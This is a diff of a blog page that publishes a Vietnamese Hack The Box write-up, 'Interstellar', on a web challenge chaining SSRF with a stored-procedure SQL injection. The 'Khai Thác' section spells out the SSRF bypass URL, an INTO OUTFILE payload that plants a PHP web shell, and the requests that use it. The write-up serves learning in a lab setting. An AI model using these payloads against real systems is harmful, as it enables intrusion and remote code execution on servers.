@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://Zyw0oz.github.io/404.html"/>
+    <link rel="canonical" href="https://Zyw0oz.github.io/2026/04/13/htb-interstellar/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -132,14 +132,19 @@
     
         
         <meta name="description" content="try with your all heart and soul">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="https://zyw0oz.github.io/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[HTB] Interstellar">
+<meta property="og:url" content="https://zyw0oz.github.io/2026/04/13/HTB-Interstellar/index.html">
 <meta property="og:site_name" content="Zyw0oz Blog">
 <meta property="og:description" content="try with your all heart and soul">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zyw0oz.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-04-13T17:08:02.000Z">
 <meta property="article:author" content="Redefine Team">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Medium">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="vietnamese">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://zyw0oz.github.io/images/redefine-og.webp">
     
@@ -153,7 +158,7 @@
     
     <title>
         
-            Page Not Found | Zywoo Blog
+            [HTB] Interstellar | Zywoo Blog
         
     </title>
 
@@ -685,15 +690,192 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">[HTB] Interstellar</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/chanDoi.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Zywoo</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-14 00:08:02</span>
+        <span class="mobile">2026-04-14 00:08:02</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/wup/">wup</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Medium/">Medium</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/vietnamese/">vietnamese</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web/">Web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
 </div>
 
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu:"></a>Giới thiệu:</h2><p>Bài này gồm 2 lỗi : SQLi và SSRF, là 1 bài exploit chain  </p>
+<p>cấu trúc cây thư mục:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└── challenge</span><br><span class="line">    ├── Dockerfile</span><br><span class="line">    ├── build_docker.sh</span><br><span class="line">    ├── entrypoint.sh</span><br><span class="line">    ├── flag.txt</span><br><span class="line">    ├── init.sql</span><br><span class="line">    └── src</span><br><span class="line">        ├── communicate.php</span><br><span class="line">        ├── images</span><br><span class="line">        │   └── background.png</span><br><span class="line">        ├── index.php</span><br><span class="line">        ├── js</span><br><span class="line">        │   └── sendForm.js</span><br><span class="line">        ├── login.php</span><br><span class="line">        ├── logout.php</span><br><span class="line">        ├── register.php</span><br><span class="line">        ├── templates</span><br><span class="line">        │   ├── communicate.tpl</span><br><span class="line">        │   ├── index.tpl</span><br><span class="line">        │   ├── login.tpl</span><br><span class="line">        │   └── register.tpl</span><br><span class="line">        └── utils</span><br><span class="line">            ├── database.php</span><br><span class="line">            ├── emoji.php</span><br><span class="line">            └── smarty.php</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p>Lỗ hổng SSRF tại communicate.php</p>
+<p>Hàm communicate.php nhận một tham số url và kiểm tra bằng Regex:<br>PHP</p>
+<p>if(preg_match(‘&#x2F;motherland.com$&#x2F;‘, $parsedUrl[‘host’]))</p>
+<p>Mục tiêu là truy cập index.php?action&#x3D;edit vốn chỉ dành cho 127.0.0.1. Tuy nhiên, sự khác biệt giữa cách PHP parse_url() xử lý và cách thư viện cURL thực thi URL cho phép ta bypass. Bằng cách sử dụng 0-scheme hoặc các ký tự đặc biệt như ;, ta có thể lừa server kết nối tới chính nó trong khi vẫn thỏa mãn điều kiện kết thúc bằng motherland.com.<br>Lỗ hổng SQL Injection tại init.sql</p>
+<p>Mặc dù PHP sử dụng Prepared Statements, nhưng logic trong Database lại bị hổng:<br>SQL</p>
+<p>CREATE PROCEDURE searchUser(IN name VARCHAR(255))<br>BEGIN<br>    SET @sql &#x3D; CONCAT(‘SELECT * FROM users WHERE name &#x3D; &#39;‘, name, ‘&#39;‘);<br>    PREPARE stmt FROM @sql;<br>    EXECUTE stmt;<br>END </p>
+<p>Tham số name được nối chuỗi trực tiếp (CONCAT). Nếu ta đổi tên người dùng (name) thành một đoạn mã SQL, khi trang index.php gọi thủ tục này, mã độc sẽ được thực thi.<br>Quyền hạn thư mục (Docker Analysis)</p>
+<p>Trong file Dockerfile, thư mục &#x2F;var&#x2F;www&#x2F;html được cấu hình với quyền ghi rất lỏng lẻo (chmod 777). Điều này cho phép user mysql ghi file trực tiếp vào thư mục web thông qua câu lệnh INTO OUTFILE.</p>
+<h2 id="Khai-Thac"><a href="#Khai-Thac" class="headerlink" title="Khai Thác"></a>Khai Thác</h2><p>Bước 1: Bypass SSRF để thay đổi tên</p>
+<p>Chúng ta không thể đăng ký tên chứa ký tự lạ vì register.php có filter Regex. Tuy nhiên, tính năng edit ở localhost thì không. Ta dùng Burp Suite gửi request tới communicate.php:</p>
+<p>Payload SSRF:</p>
+<pre><code>URL: 0://localhost:80;motherland.com:80/
+
+Data[action]: edit
+
+Data[new_name]: admin&#39; UNION SELECT &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;,2,3,4,5 INTO OUTFILE &#39;/var/www/html/shell.php&#39; -- -
+</code></pre>
+<p>Bước 2: Kích hoạt SQL Injection</p>
+<p>Sau khi đổi tên thành công thông qua SSRF, “bom” SQL Injection đã nằm trong Database&#x2F;Session. Để kích hoạt, ta chỉ cần truy cập trang chủ:<br>GET &#x2F;index.php HTTP&#x2F;1.1</p>
+<p>Lúc này, server thực hiện CALL searchUser(‘payload…’). Dấu nháy đơn (‘) sẽ thoát khỏi câu lệnh gốc, thực hiện lệnh UNION SELECT và ghi file shell.php ra thư mục web.<br>Bước 3: Thực thi mã từ xa (RCE)</p>
+<p>Bây giờ, file shell đã nằm trên server. Ta kiểm tra bằng cách liệt kê thư mục gốc &#x2F; để tìm file flag có tên ngẫu nhiên:<br>GET &#x2F;shell.php?cmd&#x3D;ls &#x2F; HTTP&#x2F;1.1</p>
+<p>Sau khi tìm thấy file có tên dạng [hex]_flag.txt, ta dùng lệnh cat để đọc nội dung:<br>GET &#x2F;shell.php?cmd&#x3D;cat &#x2F;ab12cd34ef56gh78_flag.txt HTTP&#x2F;1.1</p>
+<h2 id="Tong-ket"><a href="#Tong-ket" class="headerlink" title="Tổng kết"></a>Tổng kết</h2><p>Để bài Lab này thành công, cần phải đi qua 3 cánh cửa:</p>
+<pre><code>Cánh cửa SSRF: Để đóng vai &quot;người nhà&quot; (localhost) và tiếp cận hàm edit.
+
+Cánh cửa SQLi: Để &quot;cấy&quot; mã độc vào câu truy vấn của Database.
+
+Cánh cửa File System: Để Database ghi mã độc đó thành một file có thể truy cập được từ bên ngoài.
+</code></pre>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Medium/">#Medium</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/vietnamese/">#vietnamese</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Web/">#Web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/13/NextPath/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">[HTB] NextPath</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">[HTB] Interstellar</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Gioi-thieu"><span class="nav-text">Giới thiệu:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phan-tich"><span class="nav-text">Phân tích</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Khai-Thac"><span class="nav-text">Khai Thác</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tong-ket"><span class="nav-text">Tổng kết</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
 			</div>
 
 			
@@ -725,6 +907,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -806,6 +1004,7 @@
         containers: ["#swup"],
     });
 </script>
+
 
 
 
